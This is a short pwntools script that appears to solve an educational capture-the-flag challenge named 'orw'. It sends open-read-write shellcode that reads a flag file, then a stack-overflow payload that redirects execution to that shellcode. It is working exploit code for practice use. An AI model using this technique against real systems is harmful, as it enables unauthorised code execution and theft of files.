#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

#r = process('./orw')
r = remote('edu-ctf.csie.org',10171)

buf = 0x6010a0 
padding = 'a'*24

sh = asm("""
        xor rax,rax
        xor rdi,rdi
        xor rsi,rsi
        xor rdx,rdx
        mov rax,0x67616c662f7772
        push rax
        mov rax,0x6f2f2f656d6f682f
        push rax
        push rsp
        pop rdi
        mov rax,2
        mov rsi,0
        syscall

        mov rdi,rax
        mov rax,0
        mov rsi,0x00601500
        mov rdx,40
        syscall

        mov rax,1
        mov rdi,1
        mov rsi,0x00601500
        mov rdx,40
        syscall
""")

r.recvuntil('>\n')
r.sendline(sh)

r.recvuntil(':)\n')
raw_input('#')
r.sendline(padding + p64(buf))



r.interactive()
